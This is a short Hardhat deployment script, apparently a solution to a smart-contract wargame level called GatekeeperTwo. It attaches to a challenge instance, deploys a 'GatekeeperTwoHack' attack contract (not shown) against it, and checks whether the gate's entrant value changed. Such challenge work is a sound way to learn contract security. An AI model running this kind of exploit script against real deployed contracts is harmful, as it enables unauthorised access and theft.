// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    // Gate 2 is damn tricky. After wasting sometime, decided to pick this level later
    const INSTANCE_ADDRESS = '0x15f346A6dF2Be48BcD78755Fb0f5376b31657E5C';
    const [owner, addr1] = await ethers.getSigners();

    const GatekeeperTwo = await hre.ethers.getContractFactory("GatekeeperTwo");
    const gatekeeper = GatekeeperTwo.attach(INSTANCE_ADDRESS);
    console.log(await gatekeeper.entrant());
    

    const GatekeeperTwoHack = await hre.ethers.getContractFactory("GatekeeperTwoHack");
    const gatekeeperHack = await GatekeeperTwoHack.deploy(INSTANCE_ADDRESS);
    await gatekeeperHack.deployed()

    console.log(await gatekeeper.entrant());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
